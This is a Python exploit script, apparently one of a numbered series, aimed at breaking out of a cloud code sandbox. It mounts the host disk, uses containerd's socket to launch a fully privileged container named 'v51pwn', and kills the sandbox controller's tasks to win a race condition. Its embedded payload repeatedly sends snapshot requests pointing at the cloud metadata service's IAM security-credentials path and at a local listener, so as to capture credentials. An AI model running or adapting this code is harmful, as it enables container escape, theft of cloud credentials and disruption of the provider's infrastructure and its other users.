# -*- coding: utf-8 -*-
"""vda51: 独立 containerd 容器执行 kill-race snapshot
v48/v49/v50 教训: sandboxctrl 主进程死亡 -> containerd 终止其所有 exec(guest 一起死)
解法: 攻击负载放进独立 containerd 容器(v38 链已验证: 特权、可 mount /dev/vda、bind host 工具)
流程:
  P1 mount /dev/vda -> 写 payload 到盘 (/mnt/vdax/root/v51_payload.py)
  P2 Containers/List 拿 snapshot key
  P3 Create v51pwn (仿 v38 spec, args= mount vda + python3 payload)
  P4 Tasks/Create + Start
  P5 确认容器 init.pid 存活
  P6 Kill sandboxctrl (主 guest 必死, 容器独立存活 ~5.8s 窗口)
  P7 主 guest 兜底连打几发
输出: /mnt/vdax/root/v51m.out (主) + /mnt/vdax/root/v51c.out (容器)
"""
import os, time, socket, ctypes, re, struct, subprocess, json

OUT = '/vercel/sandbox/v51m.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')
EXTRA = '/mnt/vdax/root/v51m.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    try:
        open(EXTRA, 'a', encoding='utf-8', errors='replace').write(line + '\n')
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, t=6, ns='default'):
    try:
        tmp = '/vercel/sandbox/curl_req.bin'
        hdr = '/vercel/sandbox/curl_hdr.txt'
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: application/grpc', '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 2)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' ')[:200]
        except Exception:
            pass
        return 'rc=%d HDR:%s' % (r.returncode, hdrtxt), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pmsg(field_no, payload):
    return pvarint((field_no << 3) | 2) + pvarint(len(payload)) + payload


def rpc_unix(sockpath, path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


PAYLOAD = r'''# -*- coding: utf-8 -*-
import socket, time, os, threading
OUT = '/mnt/root/v51c.out'
def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    try:
        open(OUT, 'a', encoding='utf-8', errors='replace').write(line + '\n')
    except Exception:
        pass
    try:
        print(line, flush=True)
    except Exception:
        pass
def rpc(path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/mnt/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:300].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''
HITS = []
def listener(port=18080, seconds=40):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen(32)
        s.settimeout(seconds)
        t_end = time.time() + seconds
        while time.time() < t_end:
            try:
                c, addr = s.accept()
                c.settimeout(3)
                try:
                    data = c.recv(8192)
                    HITS.append((addr, data[:300]))
                except Exception:
                    HITS.append((addr, b''))
                c.close()
            except socket.timeout:
                continue
        s.close()
    except Exception as e:
        HITS.append(('ERR', str(e).encode()))
CSP = '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot'
def main():
    log('payload started pid=%d' % os.getpid())
    th = threading.Thread(target=listener)
    th.daemon = True
    th.start()
    time.sleep(1)
    urls = ['s3://127.0.0.1:18080/b/k',
            's3://127.0.0.1:18080/test.bin',
            's3://169.254.169.254/latest/meta-data/b/k',
            's3://127.0.0.1:1/b/k',
            's3://172.31.0.2/b/k']
    n = 0
    hits = 0
    t_end = time.time() + 50
    while time.time() < t_end:
        url = urls[n % len(urls)]
        body = '{"drive_id":"sandbox","base_url":"%s"}' % url
        t0 = time.time()
        st, bd = rpc(CSP, body, t=3)
        dt = time.time() - t0
        log('snap#%d %-48s -> %s (%.3fs) | %s' % (n, url, st, dt, bd[:150].replace('\n', ' ')))
        if 'in use' not in bd:
            hits += 1
            log('*** DRIVE FREE: %s -> %s' % (url, bd[:300]))
            urls = ['s3://169.254.169.254/latest/meta-data/iam/security-credentials/',
                    's3://169.254.169.254/latest/meta-data/',
                    's3://127.0.0.1:18080/hit%d.bin' % n,
                    's3://169.254.169.254/1.0/meta-data/']
            if hits > 6:
                break
        n += 1
        time.sleep(0.1)
    time.sleep(3)
    log('listener hits: %s' % HITS)
    log('V51C_DONE')
main()
'''


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    CSP = '/mnt/vdax/run/containerd/containerd.sock'
    IMAGE = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    CID = 'v51pwn'

    # P1: 写 payload
    pf = '/mnt/vdax/root/v51_payload.py'
    try:
        open(pf, 'w').write(PAYLOAD)
        log('payload written %d bytes' % len(PAYLOAD))
    except Exception as e:
        log('payload write ERR %s' % e)

    # P2: snapshot key
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
    m = re.search(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}-snapshot', out or b'')
    sk = m.group().decode() if m else None
    log('list %s snap_key=%s' % (rc, sk))

    # P3: Create v51pwn
    caps = ["CAP_AUDIT_CONTROL", "CAP_AUDIT_READ", "CAP_AUDIT_WRITE", "CAP_BLOCK_SUSPEND", "CAP_BPF",
            "CAP_CHECKPOINT_RESTORE", "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
            "CAP_FSETID", "CAP_IPC_LOCK", "CAP_IPC_OWNER", "CAP_KILL", "CAP_LEASE", "CAP_LINUX_IMMUTABLE",
            "CAP_MAC_ADMIN", "CAP_MAC_OVERRIDE", "CAP_MKNOD", "CAP_NET_ADMIN", "CAP_NET_BIND_SERVICE",
            "CAP_NET_BROADCAST", "CAP_NET_RAW", "CAP_PERFMON", "CAP_SETFCAP", "CAP_SETGID", "CAP_SETPCAP",
            "CAP_SETUID", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_CHROOT", "CAP_SYS_MODULE", "CAP_SYS_NICE",
            "CAP_SYS_PACCT", "CAP_SYS_PTRACE", "CAP_SYS_RAWIO", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
            "CAP_SYS_TTY_CONFIG", "CAP_SYSLOG", "CAP_WAKE_ALARM"]
    spec = {
        "ociVersion": "1.0.2",
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": ["/bin/sh", "-c",
                     "mkdir -p /mnt; mount /dev/vda /mnt 2>/dev/null; ls /mnt/root/v51_payload.py; "
                     "python3 /mnt/root/v51_payload.py; sleep 99999"],
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
            "cwd": "/",
            "capabilities": {"bounding": caps, "effective": caps, "permitted": caps, "ambient": caps}
        },
        "root": {"path": "rootfs"},
        "mounts": [
            {"destination": "/proc", "type": "proc", "source": "proc"},
            {"destination": "/dev", "type": "bind", "source": "/dev", "options": ["rbind", "rw"]},
            {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["rbind", "ro"]},
            {"destination": "/usr", "type": "bind", "source": "/usr", "options": ["rbind", "ro"]},
            {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["rbind", "ro"]},
            {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["rbind", "ro"]},
            {"destination": "/etc", "type": "bind", "source": "/etc", "options": ["rbind", "ro"]}
        ],
        "linux": {
            "resources": {"devices": [{"allow": True, "access": "rwm"}]},
            "cgroupsPath": "/v51pwn-ctr",
            "namespaces": [{"type": "mount"}, {"type": "pid"}, {"type": "uts"}, {"type": "ipc"}]
        }
    }
    spec_json = json.dumps(spec).encode()
    runtime = pstr(1, 'io.containerd.runc.v2')
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, spec_json)
    ctr = pstr(1, CID) + pstr(3, IMAGE) + pmsg(4, runtime) + pmsg(5, any_spec) + pstr(6, 'overlayfs')
    if sk:
        ctr += pstr(7, sk)
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/Create', grpc_env(pmsg(1, ctr)), t=8)
    log('Create %s out=%r' % (rc, out[:300]))
    ok = 'grpc-status: 0' in rc

    # P4: Tasks/Create + Start
    if ok:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(pstr(1, CID)), t=10)
        log('Tasks/Create %s out=%r' % (rc, out[:300]))
        if 'grpc-status: 0' not in rc:
            try:
                fp = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/%s/log.json' % CID
                if os.path.exists(fp):
                    log('log.json: %s' % open(fp, 'rb').read(1200).decode(errors='replace')[-500:])
            except Exception:
                pass
            ok = False
    if ok:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(pstr(1, CID)), t=10)
        log('Tasks/Start %s out=%r' % (rc, out[:200]))

    # P5: 确认容器存活
    time.sleep(2)
    try:
        tdir = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/%s' % CID
        log('task dir: %s' % sorted(os.listdir(tdir)) if os.path.isdir(tdir) else 'NO TASK DIR')
        fp = os.path.join(tdir, 'init.pid')
        if os.path.exists(fp):
            log('init.pid: %s' % open(fp).read().strip())
    except Exception as e:
        log('task dir ERR %s' % e)

    # P6: Kill sandboxctrl (必死, 容器独立存活)
    base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default'
    targets = []
    try:
        for d in sorted(os.listdir(base)):
            if d != CID:
                targets.append(d)
    except Exception as e:
        log('list task ERR %s' % e)
    log('kill targets: %s' % targets)
    for cid in targets:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Kill',
                          grpc_env(pstr(1, cid) + pvarint(3 << 3 | 0) + pvarint(9)), t=4)
        log('kill %s %s' % (cid, rc))

    # P7: 主 guest 兜底连打 (可能立即死)
    CS = '/mnt/vdax/run/cell/cell.sock'
    CSPR = '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot'
    n = 0
    t_end = time.time() + 4
    while time.time() < t_end:
        url = 's3://127.0.0.1:18080/m%d.bin' % n
        body = '{"drive_id":"sandbox","base_url":"%s"}' % url
        st, bd = rpc_unix(CS, CSPR, body, t=3)
        log('msnap#%d -> %s | %s' % (n, st, bd[:150].replace('\n', ' ')))
        n += 1
        time.sleep(0.1)
    log('V51M_DONE')
    f.close()


if __name__ == '__main__':
    main()
